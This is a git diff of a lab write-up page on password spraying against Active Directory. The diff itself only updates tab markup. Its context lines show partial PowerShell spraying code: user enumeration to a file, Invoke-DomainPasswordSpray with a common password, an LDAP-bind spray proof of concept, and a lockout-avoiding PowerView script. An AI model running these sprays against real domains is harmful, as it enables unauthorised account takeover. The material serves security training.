@@ -4,24 +4,24 @@ This lab explores ways of password spraying against Active Directory accounts.
 
 ## Invoke-DomainSpray
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@victim" %}
+{% tabs %}
+{% tab title="attacker@victim" %}
 ```csharp
 Get-ADUser -Properties name -Filter * | Select-Object -ExpandProperty name |  Out-File users.txt
 type users.txt
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ![](../../.gitbook/assets/screenshot-from-2019-03-20-21-29-13.png)
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@victim" %}
+{% tabs %}
+{% tab title="attacker@victim" %}
 ```csharp
 Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ![](../../.gitbook/assets/screenshot-from-2019-03-20-21-32-37.png)
 
@@ -33,8 +33,8 @@ While I was poking around with dsacls for enumerating AD object permissions
 
 I noticed that one could attempt to bind to LDAP using specific AD credentials, so a dirty AD password spraying POC came about:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@victim" %}
+{% tabs %}
+{% tab title="attacker@victim" %}
 ```csharp
 $domain = ((cmd /c set u)[-3] -split "=")[-1]
 $pdc = ((nltest.exe /dcname:$domain) -split "\\\\")[1]
@@ -54,8 +54,8 @@ $password = "123456"
     }
 }
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ![](../../.gitbook/assets/screenshot-from-2019-03-20-00-10-10.png)
 
@@ -63,8 +63,8 @@ $password = "123456"
 
 Similarly to dsacls, it's possible to spray passwords with `Start-Process` cmdlet and the help of PowerView's cmdlets:
 
-{% code-tabs %}
-{% code-tabs-item title="spray-ldap.ps1" %}
+{% tabs %}
+{% tab title="spray-ldap.ps1" %}
 ```csharp
 # will spray only users that currently have 0 bad password attempts
 # dependency - powerview
@@ -94,8 +94,8 @@ Write-Host $users.Count users supplied; $users | % {
     }
 }
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 Enjoy the shells:
 
